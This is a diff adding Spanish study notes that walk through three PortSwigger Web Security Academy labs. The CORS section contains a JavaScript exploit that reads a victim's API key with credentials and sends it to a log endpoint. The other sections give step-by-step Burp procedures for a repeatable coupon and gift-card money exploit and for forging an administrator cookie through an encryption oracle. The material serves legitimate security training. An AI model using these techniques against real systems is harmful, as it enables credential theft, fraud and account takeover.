@@ -687,6 +687,25 @@ Cuando se carga el `iframe`, después de medio segundo (para que se cargue el co
 
 ## [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
 
+### [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+
+Al autenticarnos en este laboratorio e ir a la sección Account Details, vemos que se imprime el apikey. Yendo a burpsuite y analizando la petición y respuesta que se envían al entrar a esta sección, vemos que en el encabezado  de la respuesta Access-Control-Allow-Credentials se devuelve el dominio de nuestro lab. Volviendo a la request y mandándola al repeater de burpsuite, si manualmente colocamos un encabezado Origin disitinto, el encabezado Access-Control-Allow-Credentials de la respuesta devolverá el dominio del origin.
+
+Para resolver este lab, copiamos la url de la sección Home, y le anexamos "accountDetails" (debido a que a esta url se hacen las peticiones que devuelve la apikey, se puede ver analizando el HTTP History de burpsuite), y la pegamos en el siguiente script.
+Luego de pulsar el botón deliver exploit to victim, debemos ver las respuestas del servidor yendo a la sección Acces log. Una vez allí, buscamos "log?key", y lo que sigue será el apikey que debemos enviar.
+
+```javascript
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://ac0d1f601f36270f80786122008800b8.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+    var x = JSON.parse(this.responseText);
+    location='/log?key='+ x.apikey;
+};
+```
+
 ---
 
 ## [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
@@ -1743,7 +1762,49 @@ Para resolver este laboratorio se debe:
 
 ### [Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
 
+Para resolver este laboratorio se debe:
+
+1. Con el Intercept de Burp activado, iniciar sesión y suscribirse al *newsletter* para obtener un cupón de descuento `SIGNUP30`.
+2. Agregar al carrito una `Gift card` e ir al checkout. Aplicar el código para obtener un 30% de descuento. Confirmar la orden y copiar el código de la gift card.
+3. Ir a My account y *redimir* la gift card. Esto agrega $3 al saldo de la tienda.
+4. En HTTP history, la request `POST /gift-card` contiene el código de la misma al *redimirse*.
+5. Ir a "Project options" > "Sessions". En el panel "Session handling rules" hacer clic en "Add". Se abre el diálogo "Session handling rule editor".
+6. Ir a la pestaña "Scope". Dentro de "URL Scope" seleccionar "Include all URLs".
+7. Volver a la pestaña "Details". Dentro de "Rule actions" hacer clic en "Add" > "Run a macro". Dentro de "Select macro" hacer clic en "Add" para abrir el Macro Recorder.
+8. Seleccionar las siguientes requests (en este orden), Después hacer clic en "OK". Se abre el Macro editor.
+
+```
+POST /cart
+POST /cart/coupon
+POST /cart/checkout
+GET /cart/order-confirmation?order-confirmed=true
+POST /gift-card
+```
+
+9. En la lista de requests, seleccionar `GET /cart/order-confirmation?order-confirmed=true`. Hacer clic en "Configure item". En el diálogo que se abre hacer clic en "Add" para crear un nuevo parámetro, al que ahy que llamarlo `gift-card`. Seleccionar el código de la gift card al final de la response. Hacer clic en "OK" dos veces para volver al Macro Editor.
+10. Seleccionar la request `POST /gift-card` y hacer clic en "Configure item" otra vez. En la sección "Parameter handling" seleccionar "Derive from prior response" del drop-down al lado de `gift-card`, y en el de al lado seleccionar "Response 4". Hacer clic en "OK".
+11. En el Macro Editor, hacer clic en "Test macro". Ver el código de la gift card generado en la response a `GET /cart/order-confirmation?order-confirmation=true`. Asegurarse que el parámetro `gift-card` de `POST /gift-card request` coincide con el código anterior y de que la response tiene código 302. Hacer clic en "OK" hasta volver a la ventana principal del Burp.
+12. Enviar la request `GET /my-account` a Intruder. Usar el ataque "Sniper" y hacer clic en "Clear §".
+13. En la pestaña "Payloads", seleccionar el tipo de payload "Null payloads". Dentro de "Payload options" elegir generar 412 payloads. En la pestaña "Options", poner el "thread count" en 1. Empezar el ataque.
+14. Cuando termine el ataque, comprar el *Lightweight l33t leather jacket* y listo.
+
 ### [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
+
+Para resolver este lab se debe:
+
+1. Iniciar sesión con la opción "Stay logged in" activada y hacer un comentario. En la request interceptada por Burp la cookie `stay-logged-in` está encriptada.
+2. Hacer otro comentario pero con una dirección de correo inválida (ej: `foofoofoobarbarbar`). En la response habrá una cookie `notification` encriptada, y luego se redirige a la entrada del blog.
+3. En el blog va a haber un mensaje de error `Invalid email address: email-invalido-ingresado`. Al parecer, eso se desencripta de la cookie de `notification`. Enviar las request `POST /post/comment` y `GET /post?postId=x` a Repeater.
+4. Dentro de Repeaterm se puede usar el parámetro `email` del POST para encriptar cualquier cosa, y ver el texto cifrado en el header `Set-Cookie`. También se puede usar la cookie `notification` del GET para desencriptar otra cualquier cosa y ver el resultado en el mensaje de error del blog (el laboratorio recomienda renombrar las pestañas de ambas request, para saber cuál encripta y cuál desencripta).
+5. En la request de desencriptar, copiar la cookie `stay-logged-in` y pegarla en `notification`. Enviar la request. Ahora la response ya no tiene mensaje de error, sino que tiene esa cookie pero desencriptada. El formato de salida es `usario:timestamp`. Copiar el timestamp.
+6. Ir a la request de encriptar y cambiar el parámetro `email` por `administrator:timestamp`. Enviar la request y copiar el nuevo valor de `notification` de la response.
+7. Desencriptar el valor obtenido. Sea cual sea el valor ques se pase, se agrega el prefijo `Invalid email address: `. Enviar el valor de `notification` a Decoder.
+8. En Decoder, decodear en URL y Base64 la cookie. Seleccionar "Hex", hacer clic derecho en el primer byte, seleccionar "Delete bytes" y eliminar 23 bytes (para limpiar el mensaje de Invalid email).
+9. Volver a encodear el resultado, copiarlo en `notification` y enviar la request. Ahora en la response va a haber un mensaje de error, indicando que la entrada a encriptar debe ser múltiplo de 16 (porque usa un algoritmo de encriptación por bloques).
+10. Volver a la request de encriptar en Repeater y agregar 9 caracteres cualesquiera al comienzo del valor de `email` (por ejemplo: `xxxxxxxxxadministrator:your-timestamp`). Enviar la request y desencriptar.
+11. Enviar el texto cifrado a Decoder y volver a decodear como antes. Eliminar 32 bytes al comienzo. Volver a encodear y pegar el resultado en `notification`. Ahora el resultado en la response debería ser `administrator:timestamp`.
+12. En HTTP history, enviar la request `GET /` a Repeater. Borrar la cookie `session` y reemplazar la cookie `stay-logged-in` con el último texto cifrado. Enviar la request, y ahora se va a estar logueado como administrator.
+13. Usando Repeater, navegar a `/admin/delete?username=carlos` para resolver el laboratorio.
 
 ---
 
